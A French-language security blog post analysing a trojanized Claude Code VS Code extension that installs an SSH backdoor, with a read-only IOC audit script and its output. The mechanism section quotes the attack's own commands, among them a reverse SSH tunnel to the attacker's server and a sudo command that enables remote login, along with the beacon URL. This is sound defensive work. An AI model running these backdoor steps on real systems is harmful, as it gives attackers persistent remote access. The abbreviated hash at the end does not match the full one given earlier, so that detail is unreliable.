---
titre: "Une extension Claude Code trojanée installe une backdoor SSH : l'audit en 7 points pour ta machine"
date: 2026-10-30
themes: securite, agents
resume: "anthropic.claude-code@2.1.313 sur Open-VSX embarquait un loader de 66 lignes qui backdoorait ta machine dès le chargement dans VS Code. Le mécanisme, chaque IOC, et un script d'audit en lecture seule lancé sur ma machine : 7 vérifications, 0 indicateur, exit 0."
source: https://dev.to/slabb/a-trojanized-claude-code-extension-plants-an-ssh-backdoor-the-7-point-audit-for-your-machine-23cj
image: https://media2.dev.to/dynamic/image/width=1000,height=420,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fc9yskyveqblvop4rm3bb.png
image_alt: "Une extension Claude Code trojanée installe une backdoor SSH : l'audit en 7 points"
---

> Le drop supply-chain du matin, vieux de deux heures au moment où j'écris : l'extension VS Code **`anthropic.claude-code@2.1.313` a été trojanée sur Open-VSX**, publiée depuis le compte d'un employé d'Anthropic, et la version malveillante embarquait un **loader de 66 lignes** inséré devant le code légitime. Pas besoin de discuter avec Claude, de cliquer quoi que ce soit ou d'approuver quoi que ce soit : **le simple chargement de l'extension au démarrage de VS Code exécutait le payload.** Il a inventorié ta machine, ajouté une clé SSH nommée `svc-telemetry` dans ton `authorized_keys`, activé le login distant, ouvert un reverse tunnel vers un serveur attaquant, et persisté en LaunchAgent déguisé en `com.apple.sysmond`. L'[analyse complète](https://opensourcemalware.com/blog/trojanized-claude-code-extension-plants-persistent-ssh-backdoor) est sortie ; ce post, c'est le mécanisme en étapes claires, chaque IOC, et un script d'audit en lecture seule que j'ai déjà lancé sur ma propre machine. Tout utilisateur de Claude Code, Cursor, Windsurf ou VS Code devrait le lancer ce soir.

C'est la quatrième histoire de supply-chain d'agents couverte par ce blog ce mois-ci, et la plus intime : LiteLLM volait les credentials avec lesquelles ton code tourne, Gheist récoltait les secrets que ton CI détient, et maintenant l'outil dans lequel vit ton agent est le dropper. Le périmètre ne cesse de se rapprocher.

## Ce que fait le loader, étape par étape

Le build trojané ne différait du légitime que par un seul fichier, `extension.js`, où un IIFE (important `process`, `fs`, `os`, `http`, `crypto`) était préfixé au vrai code. Pas de scripts de cycle de vie npm, pas de packing exotique. Puis, au chargement de l'extension :

1. **Recon** : `hostname`, `username`, OS et architecture, home directory, **git email**, et les **noms de jusqu'à 40 variables d'environnement** correspondant à `KEY`, `TOKEN`, `SECRET`, `PASS`, `AWS`, `GCP`. Des noms, pas des valeurs, à ce stade : l'inventaire de ce que tu possèdes.
2. **Accès SSH** : crée `~/.ssh` (`0700`) et ajoute une clé publique Ed25519 avec le commentaire **`svc-telemetry`** dans `authorized_keys` (`0600`). Empreinte : `SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk`.
3. **Accès distant activé** : sur macOS il lance `sudo -n systemsetup -setremotelogin on` (fonctionne si ton utilisateur a le sudo sans mot de passe, échoue silencieusement sinon) ; sur Linux il active `sshd` ; sur Windows il installe le **OpenSSH Server**.
4. **Reverse tunnel** : décode une clé privée embarquée dans `${TMPDIR}/.stk_<id>` et boucle sur `ssh tunnel@134.209.82.225 -N -R '*:0:localhost:22'` avec la vérification de host-key désactivée, reconnexion toutes les 60 secondes (`autossh` quand disponible). Leur serveur peut maintenant atteindre ton SSH, depuis n'importe où, à travers ta propre connexion sortante.
5. **Persistance** : LaunchAgent macOS **`com.apple.sysmond.plist`** (`RunAtLoad`, `KeepAlive`), un nom choisi pour sentir le daemon système ; crontab `@reboot` sur Linux ; tâche planifiée **`SysMon`** en `SYSTEM` sur Windows.
6. **Beacon** : après 1,5 seconde, récupère ton IP publique depuis `ifconfig.me` ou `api.ipify.org` et POSTe le JSON de recon vers `http://134.209.82.225:8099/beacon`. La réponse est ignorée ; aucun downloader de second stade n'a été trouvé dans cet échantillon.

Le crédit de la découverte revient à Dean Hardcastle, qui **l'a vu se produire en temps réel**. Caveat importante des analystes eux-mêmes : l'échantillon trojané venait d'Open-VSX ; la copie du Microsoft Marketplace a été retirée « par excès de précaution », et rien de publié ne prouve que l'infrastructure d'Anthropic elle-même a été compromise. Le compte publisher est la question ouverte.

## L'audit : 7 vérifications, lecture seule, le code de sortie répond

J'ai écrit le sweep depuis les IOC publiés et je l'ai lancé sur ma machine avant d'écrire ce post. Lecture seule : il vérifie, il ne modifie jamais.

```sh
#!/bin/sh
# hunt_claude_ext.sh - IOC sweep pour anthropic.claude-code@2.1.313 trojanée
set -u
FOUND=0
hit()  { FOUND=$((FOUND+1)); echo "[!!] $1"; }
clean(){ echo "[ok] $1"; }

# 1. la clé de la backdoor SSH
grep -q "svc-telemetry" "$HOME/.ssh/authorized_keys" 2>/dev/null \
  && hit "authorized_keys contains the svc-telemetry backdoor key" \
  || clean "authorized_keys has no svc-telemetry key"

# 2. le LaunchAgent déguisé
[ -f "$HOME/Library/LaunchAgents/com.apple.sysmond.plist" ] \
  && hit "rogue LaunchAgent com.apple.sysmond.plist present" \
  || clean "no rogue com.apple.sysmond LaunchAgent"

# 3. les fichiers marqueurs
for f in "$HOME/.config/.smt" "$HOME/.config/.smtk" "$HOME/.config/smt.cmd"; do
  [ -f "$f" ] && hit "marker file $f present"
done
clean "no .smt/.smtk/smt.cmd markers"

# 4. les clés du tunnel
ls "${TMPDIR:-/tmp}"/.stk_* >/dev/null 2>&1 \
  && hit "tunnel key .stk_* in TMPDIR" || clean "no .stk_* in TMPDIR"

# 5. le processus de tunnel vivant
pgrep -af ssh 2>/dev/null | grep -Eq "134\.209\.82\.225|-R \*:0:localhost:22" \
  && hit "live ssh process matching the C2 tunnel signature" \
  || clean "no ssh process matching the C2 tunnel"

# 6. l'extension elle-même : hasher le loader de chaque copie installée
EXT_HASH="ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15"
for d in "$HOME/.vscode/extensions"/anthropic.claude-code-* \
         "$HOME/.vscode-server/extensions"/anthropic.claude-code-* \
         "$HOME/.cursor/extensions"/anthropic.claude-code-*; do
  [ -f "$d/extension.js" ] || continue
  [ "$(shasum -a 256 "$d/extension.js" | cut -d' ' -f1)" = "$EXT_HASH" ] \
    && hit "$d/extension.js MATCHES the trojan hash"
done
clean "no installed extension.js matching the trojan hash"

# 7. Remote Login macOS activé de façon inattendue
sudo -n systemsetup -getremotelogin 2>/dev/null | grep -q "On" \
  && echo "[??] Remote Login is ON, verify you enabled it yourself" \
  || clean "Remote Login off"

echo "== $FOUND indicator(s) found =="
[ "$FOUND" -gt 0 ] && exit 1 || exit 0
```

Mon run, ce soir, sur la machine où je tape ce post :

```text
[ok] authorized_keys has no svc-telemetry key
[ok] no rogue com.apple.sysmond LaunchAgent
[ok] no .smt/.smtk/smt.cmd markers
[ok] no .stk_* in TMPDIR
[ok] no ssh process matching the C2 tunnel
[ok] no installed extension.js matching the trojan hash
[ok] Remote Login off
== 0 indicator(s) found ==   (exit 0)
```

Un run propre n'est pas un certificat de santé éternel (l'échantillon analysé est un build ; les opérateurs itèrent), mais il répond à la question du soir. Si un check tombe : déconnecte la machine du réseau, **rotate les credentials depuis un système différent et propre** (ils ont inventorié les noms de tes variables d'env pour une raison), préserve les artefacts, et rebuild. Un accès SSH interactif signifie que ce que tu trouves peut sous-estimer ce qui s'est passé.

## La leçon, encore : épingle ce que tu exécutes

Trois notes structurelles, parce que le mécanisme va se répéter :

- **Open-VSX et le Marketplace servent des bits mutables.** Un compte publisher (ici : celui d'un employé d'Anthropic, avec un point d'interrogation sur le comment) peut remplacer le code d'une extension de confiance, et chaque client en auto-update le reçoit. La défense qui aurait attrapé ça en une seconde, c'est le **hash pinning**, et presque personne ne le fait pour les extensions. Le check 6 du script est le pattern : `shasum -a 256` sur le loader de tout ce que tu installes de critique, enregistré quand tu l'installes volontairement.
- **« Charger, c'est exécuter. »** Le payload a tourné à l'activation de l'extension, avant toute interaction de l'utilisateur avec l'outil. Le modèle mental « je ne m'en sers que quand je le décide » ne survit pas au contact avec la façon dont les extensions se chargent réellement.
- **Le nom de la persistance est un artefact de social engineering.** `com.apple.sysmond`, `SysMon`, `svc-telemetry` : chaque IOC de cette attaque est conçu pour survivre à un `ls` distrait. C'est pour ça que l'audit vérifie des noms exacts et des hash exacts, pas des vibes.

Le registre du mois jusqu'ici : deux releases compromises du proxy LLM le plus populaire, 13 500 workflows de vidage de secrets dans le CI, les transcripts des agents de fond envoyés au modèle, et maintenant une extension d'agent trojanée avec persistance SSH. Les agents ne sont pas la vulnérabilité. L'écosystème qui s'assemble autour d'eux, si.

**TL;DR** : `anthropic.claude-code@2.1.313` trojanée sur Open-VSX a backdooré des machines au chargement de l'extension : clé SSH `svc-telemetry`, Remote Login activé, reverse tunnel vers `134.209.82.225`, LaunchAgent déguisé en `com.apple.sysmond`. Audit en lecture seule de sept checks ci-dessus, ma machine : zéro indicateur. Lance le tien, hash ce que tu installes, et si un check tombe : rotate depuis une machine propre et rebuild.

Sources : [OpenSourceMalware : Trojanized Claude Code Extension Plants an SSH Backdoor](https://opensourcemalware.com/blog/trojanized-claude-code-extension-plants-persistent-ssh-backdoor) · IOCs : extension.js SHA-256 `ecb58cb2…c6bf15`, C2 `134.209.82.225` (22, 8099), empreinte de clé `SHA256:0Z6R+…htk`
